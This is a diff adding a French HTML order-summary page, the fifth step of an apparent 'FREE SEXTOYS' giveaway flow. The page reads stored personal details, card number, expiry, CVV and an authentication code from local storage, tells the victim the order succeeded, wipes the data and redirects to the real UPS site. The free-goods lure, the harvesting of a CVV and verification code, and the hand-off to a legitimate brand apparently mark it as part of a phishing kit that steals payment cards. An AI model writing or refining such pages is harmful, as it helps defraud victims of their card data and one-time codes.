@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>FREE SEXTOYS - Résumé</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(135deg, #1A2526 0%, #2C3E50 100%);
+            color: #FFFFFF;
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        nav {
+            background: #131921;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+        nav h1 {
+            color: #FF6200;
+            margin: 0;
+            font-size: 28px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
+        }
+        .progress {
+            text-align: center;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 25px;
+            margin: 10px 0;
+        }
+        .progress span {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            line-height: 40px;
+            border-radius: 50%;
+            margin: 0 15px;
+            background: #FF6200;
+            color: #FFFFFF;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease;
+        }
+        .progress span.inactive {
+            background: #666;
+            transform: scale(0.8);
+        }
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 30px;
+            border-radius: 20px;
+            background: #FFFFFF;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+            transition: transform 0.3s ease;
+        }
+        .container:hover {
+            transform: translateY(-5px);
+        }
+        .summary {
+            color: #0F1111;
+            line-height: 1.6;
+        }
+        .summary h2 {
+            color: #FF6200;
+            font-size: 24px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .summary p {
+            font-size: 16px;
+            margin: 10px 0;
+        }
+        #redirect {
+            text-align: center;
+            font-weight: bold;
+            color: #FF6200;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <nav><h1 id="title">FREE SEXTOYS - Résumé</h1></nav>
+    <div class="progress">
+        <span class="inactive">1</span><span class="inactive">2</span><span class="inactive">3</span><span class="inactive">4</span><span>5</span>
+    </div>
+    <div class="container">
+        <div class="summary">
+            <h2 id="congrats">Félicitations ! Votre commande chez FREE SEXTOYS a été soumise avec succès.</h2>
+            <p id="confirmation">Un message de confirmation vous sera envoyé dans les 72 heures. Merci de votre confiance !</p>
+            <p id="summaryTitle"><strong>Résumé de votre commande :</strong></p>
+            <p id="summaryDetails"></p>
+            <p id="redirect">Redirection vers UPS dans <span id="countdown">15</span>s...</p>
+        </div>
+    </div>
+
+    <script>
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const country = data.country_code;
+                let lang = 'en';
+                if (country === 'FR') lang = 'fr';
+                if (country === 'DE') lang = 'de';
+                changeLanguage(lang);
+            })
+            .catch(error => {
+                console.error('Erreur lors de la détection de langue :', error);
+                changeLanguage('en');
+            });
+
+        function changeLanguage(lang) {
+            const title = document.getElementById('title');
+            const congrats = document.getElementById('congrats');
+            const confirmation = document.getElementById('confirmation');
+            const summaryTitle = document.getElementById('summaryTitle');
+            const redirect = document.getElementById('redirect');
+
+            if (lang === 'fr') {
+                title.textContent = 'FREE SEXTOYS - Résumé';
+                congrats.textContent = 'Félicitations ! Votre commande chez FREE SEXTOYS a été soumise avec succès.';
+                confirmation.textContent = 'Un message de confirmation vous sera envoyé dans les 72 heures. Merci de votre confiance !';
+                summaryTitle.innerHTML = '<strong>Résumé de votre commande :</strong>';
+                redirect.innerHTML = 'Redirection vers UPS dans <span id="countdown">15</span>s...';
+            } else if (lang === 'en') {
+                title.textContent = 'FREE SEXTOYS - Summary';
+                congrats.textContent = 'Congratulations! Your order with FREE SEXTOYS has been successfully submitted.';
+                confirmation.textContent = 'A confirmation message will be sent to you within 72 hours. Thank you for your trust!';
+                summaryTitle.innerHTML = '<strong>Summary of your order:</strong>';
+                redirect.innerHTML = 'Redirecting to UPS in <span id="countdown">15</span>s...';
+            } else if (lang === 'de') {
+                title.textContent = 'FREE SEXTOYS - Zusammenfassung';
+                congrats.textContent = 'Herzlichen Glückwunsch! Ihre Bestellung bei FREE SEXTOYS wurde erfolgreich übermittelt.';
+                confirmation.textContent = 'Eine Bestätigungsnachricht wird Ihnen innerhalb von 72 Stunden zugesandt. Vielen Dank für Ihr Vertrauen!';
+                summaryTitle.innerHTML = '<strong>Zusammenfassung Ihrer Bestellung:</strong>';
+                redirect.innerHTML = 'Weiterleitung zu UPS in <span id="countdown">15</span>s...';
+            }
+        }
+
+        const selectedItems = JSON.parse(localStorage.getItem('selectedItems')) || [];
+        const userInfos = JSON.parse(localStorage.getItem('userInfos')) || {};
+        const paiement = {
+            adresseLivraison: localStorage.getItem('adresseLivraison') || '',
+            numeroDestinataire: localStorage.getItem('numeroDestinataire') || '',
+            titulaire: localStorage.getItem('titulaire') || '',
+            carte: localStorage.getItem('carte') || '',
+            expiration: localStorage.getItem('expiration') || '',
+            cvv: localStorage.getItem('cvv') || ''
+        };
+        const auth = JSON.parse(localStorage.getItem('auth')) || {};
+
+        document.getElementById('summaryDetails').innerHTML = `
+            Articles choisis: ${selectedItems.length > 0 ? selectedItems.join(', ') : 'Aucun article sélectionné'}<br>
+            Nom: ${userInfos.nom || ''}<br>
+            Email: ${userInfos.email || ''}<br>
+            Téléphone: ${userInfos.telephone || ''}<br>
+            Pays: ${userInfos.pays || ''}<br>
+            Ville: ${userInfos.ville || ''}<br>
+            Code postal: ${userInfos.codepostal || ''}<br>
+            Adresse: ${userInfos.adresse || ''}<br>
+            Adresse de livraison: ${paiement.adresseLivraison || ''}<br>
+            Numéro de destinataire: ${paiement.numeroDestinataire || ''}<br>
+            Code d'authentification: ${auth.code || ''}<br>
+        `;
+
+        let countdown = 15;
+        const countdownElement = document.getElementById('countdown');
+        const interval = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+            if (countdown <= 0) {
+                clearInterval(interval);
+                window.location.href = 'https://www.ups.com/fr/fr/home';
+            }
+        }, 1000);
+
+        localStorage.clear();
+    </script>
+</body>
+</html>
